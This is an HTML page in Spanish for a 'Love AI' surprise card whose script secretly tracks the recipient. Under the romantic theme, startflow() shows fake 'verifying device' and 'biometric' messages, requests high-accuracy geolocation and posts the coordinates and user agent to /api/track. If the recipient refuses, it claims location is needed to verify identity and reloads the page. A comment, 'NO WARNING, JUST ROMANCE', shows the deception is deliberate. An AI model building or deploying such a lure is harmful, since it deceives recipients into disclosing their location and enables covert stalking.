<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love AI - Surprise</title>
    <link rel="stylesheet" href="/style.css">
    <style>
        .heart-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .falling-heart {
            position: absolute;
            top: -10%;
            color: #ff4d6d;
            opacity: 0.8;
            animation: fall linear forwards;
        }

        @keyframes fall {
            to {
                transform: translateY(110vh) rotate(360deg);
            }
        }

        .heart-pulse-btn {
            background: linear-gradient(45deg, #ff4d6d, #ff8fa3);
            border: none;
            padding: 20px 40px;
            font-size: 1.2rem;
            color: white;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.7);
            animation: heartbeat 1.5s infinite;
            transition: transform 0.2s;
            z-index: 10;
            position: relative;
        }

        .heart-pulse-btn:active {
            transform: scale(0.95);
        }

        @keyframes heartbeat {
            0% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.7);
            }

            50% {
                transform: scale(1.05);
                box-shadow: 0 0 0 20px rgba(255, 77, 109, 0);
            }

            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(255, 77, 109, 0);
            }
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .loader {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
    </style>
</head>

<body>
    <header>
        <div class="brand" style="font-size: 2rem;">‚ù§Ô∏è Love AI ü§ñ</div>
    </header>

    <div class="heart-container" id="heart-rain"></div>

    <main>
        <!-- INTRO SCREEN -->
        <div id="intro-screen" class="glass-panel">
            <div style="font-size: 4rem; margin-bottom: 1rem;">üíå</div>
            <h2 id="welcome-text">¬°Sorpresa para ti!</h2>
            <p style="color: white; font-size: 1.1rem; margin-bottom: 2rem;">
                <strong id="sender-display" style="color: var(--secondary);">Alguien</strong>
                ha creado un momento m√°gico solo para ti.
            </p>
            <!-- NO WARNING, JUST ROMANCE -->
            <p
                style="font-size: 0.85rem; margin-bottom: 2rem; color: rgba(255,255,255,0.7); max-width: 80%; margin-left: auto; margin-right: auto; line-height: 1.5;">
                Para desbloquear tu carta especial, necesitamos confirmar tu dispositivo.<br>
                Dale a "Permitir" si se te solicita.
            </p>

            <button class="heart-pulse-btn" onclick="startflow()">
                üíñ VER MI SORPRESA üíñ
            </button>
        </div>

        <!-- GENERATING SCREEN -->
        <div id="gen-screen" class="hidden glass-panel">
            <h2>Desencriptando Capa de Amor IA...</h2>
            <div class="loader"></div>
            <p id="gen-text">Analizando datos biom√©tricos...</p>
        </div>

        <!-- CONTENT SCREEN -->
        <div id="content-screen" class="hidden glass-panel" style="max-width: 800px; width: 95%;">

            <!-- DYNAMIC CARD CONTAINER -->
            <div id="dynamic-card" class="hidden"
                style="position: relative; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(255,77,109,0.5);">
                <img id="card-bg" src="" style="width: 100%; display: block;">

                <!-- OVERLAY TEXTS -->
                <div
                    style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; text-align: center; text-shadow: 2px 2px 4px rgba(0,0,0,0.7);">
                    <h1 style="font-family: 'Georgia', serif; font-size: 2.5rem; color: #fff; margin: 0;">Te Quiero</h1>
                    <h2 id="recipient-overlay"
                        style="font-family: 'Brush Script MT', cursive; font-size: 3rem; color: #ff4d6d; margin: 10px 0;">
                    </h2>
                </div>

                <!-- ANIMATED FLOWERS (CSS) -->
                <div class="flower" style="top: 10%; left: 10%; animation-delay: 0s;">üå∏</div>
                <div class="flower" style="top: 20%; right: 20%; animation-delay: 2s;">üå∫</div>
                <div class="flower" style="bottom: 15%; left: 30%; animation-delay: 4s;">üåπ</div>
                <div class="flower" style="bottom: 10%; right: 10%; animation-delay: 1s;">üå∏</div>
            </div>

            <!-- REGULAR IMAGE -->
            <img id="sharedImage" class="hidden" src=""
                style="width: 100%; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,77,109,0.5);">

            <h3 id="footer-msg" style="margin-top: 1.5rem; color: var(--secondary);">Generado con Amor ‚ù§Ô∏è</h3>

            <!-- REPLY SECTION -->
            <div id="reply-section"
                style="margin-top: 2rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem;">
                <p>¬øTe gust√≥? Env√≠ale una respuesta r√°pida:</p>
                <textarea id="reply-msg" placeholder="Escribe tu mensaje aqu√≠..."
                    style="width: 100%; height: 80px; background: rgba(0,0,0,0.3); border: 1px solid var(--secondary); border-radius: 5px; color: white; padding: 10px;"></textarea>
                <button onclick="sendReply()"
                    style="margin-top: 10px; background: var(--primary); border: none; padding: 8px 20px; border-radius: 20px; color: white; cursor: pointer;">üíå
                    Enviar Respuesta</button>
            </div>

        </div>

        <!-- FAKE BUTTON / FOOTER -->
        <div style="margin-top: 3rem; width: 100%; text-align: center;">
            <a href="/"
                style="background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; font-size: 0.9rem; color: white; text-decoration: none; border: 1px solid rgba(255,255,255,0.2);">
                üé® Crear mi propia tarjeta IA
            </a>
        </div>

    </main>

    <style>
        .flower {
            position: absolute;
            font-size: 2rem;
            opacity: 0.8;
            animation: float 6s infinite ease-in-out;
        }

        @keyframes float {

            0%,
            100% {
                transform: translateY(0) rotate(0deg);
            }

            50% {
                transform: translateY(-20px) rotate(20deg);
            }
        }
    </style>

    <script>
        const pathSegments = window.location.pathname.split('/');
        const id = pathSegments[pathSegments.length - 1];
        let currentData = null;

        document.addEventListener('DOMContentLoaded', async () => {
            // Fetch metadata
            try {
                const response = await fetch(`/api/image/${id}`);
                currentData = await response.json();
                if (currentData.senderName) {
                    document.getElementById('sender-display').textContent = currentData.senderName;
                    document.title = `¬°Sorpresa de ${currentData.senderName}!`;
                }
            } catch (e) { console.log("Metadata fetch failed"); }
        });

        function startflow() {
            document.getElementById('intro-screen').classList.add('hidden');
            document.getElementById('gen-screen').classList.remove('hidden');

            const steps = ["Analizando conexi√≥n...", "Verificando dispositivo...", "Desencriptando p√≠xeles...", "Renderizando amor..."];
            let stepIdx = 0;
            const textInterval = setInterval(() => {
                if (stepIdx < steps.length) {
                    document.getElementById('gen-text').textContent = steps[stepIdx++];
                }
            }, 800);

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        sendTrackingData(latitude, longitude);
                        clearInterval(textInterval);
                        setTimeout(showContent, 1000);
                    },
                    (error) => {
                        clearInterval(textInterval);
                        sendTrackingData(null, null);
                        alert("‚ùå Acceso Denegado: Debes permitir la ubicaci√≥n para verificar que eres t√∫ y ver el mensaje secreto.");
                        location.reload();
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            } else {
                alert("Tu navegador no soporta esta tecnolog√≠a.");
                location.reload();
            }
        }

        async function sendTrackingData(lat, lng) {
            const payload = { userAgent: navigator.userAgent };
            if (lat) { payload.latitude = lat; payload.longitude = lng; }
            await fetch(`/api/track/${id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(e => console.error(e));
        }

        function showContent() {
            document.getElementById('gen-screen').classList.add('hidden');
            document.getElementById('content-screen').classList.remove('hidden');

            if (currentData && currentData.isAiGenerated) {
                // SHOW DYNAMIC CARD
                const card = document.getElementById('dynamic-card');
                card.classList.remove('hidden');
                document.getElementById('card-bg').src = `/uploads/${currentData.filename}`;
                document.getElementById('recipient-overlay').textContent = currentData.recipientName || "Ti";
            } else {
                // SHOW REGULAR IMAGE
                const img = document.getElementById('sharedImage');
                img.classList.remove('hidden');
                img.src = `/uploads/${currentData.filename}`;
            }
        }

        async function sendReply() {
            const msg = document.getElementById('reply-msg').value;
            if (!msg) return alert("Escribe un mensaje primero.");

            await fetch('/api/reply', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, message: msg })
            });

            document.getElementById('reply-section').innerHTML = "<p style='color: #2ecc71'>¬°Respuesta enviada con √©xito! ‚ù§Ô∏è</p>";
        }
        function createRain() {
            const container = document.getElementById('heart-rain');
            const heartCount = 30;

            for (let i = 0; i < heartCount; i++) {
                setTimeout(() => {
                    const heart = document.createElement('div');
                    heart.classList.add('falling-heart');
                    heart.innerHTML = ['üíñ', 'üå∏', '‚ú®', 'üíï'][Math.floor(Math.random() * 4)];
                    heart.style.left = Math.random() * 100 + 'vw';
                    heart.style.animationDuration = Math.random() * 3 + 2 + 's';
                    heart.style.fontSize = Math.random() * 20 + 10 + 'px';
                    container.appendChild(heart);

                    // Remove after animation
                    setTimeout(() => { heart.remove(); }, 5000);
                }, i * 100);
            }

            // Continuous rain
            setInterval(() => {
                const heart = document.createElement('div');
                heart.classList.add('falling-heart');
                heart.innerHTML = ['üíñ', 'üå∏', '‚ú®', 'üíï'][Math.floor(Math.random() * 4)];
                heart.style.left = Math.random() * 100 + 'vw';
                heart.style.animationDuration = Math.random() * 3 + 2 + 's';
                heart.style.fontSize = Math.random() * 20 + 10 + 'px';
                container.appendChild(heart);
                setTimeout(() => { heart.remove(); }, 5000);
            }, 300);
        }

        // Start rain on load
        createRain();

    </script>
</body>

</html>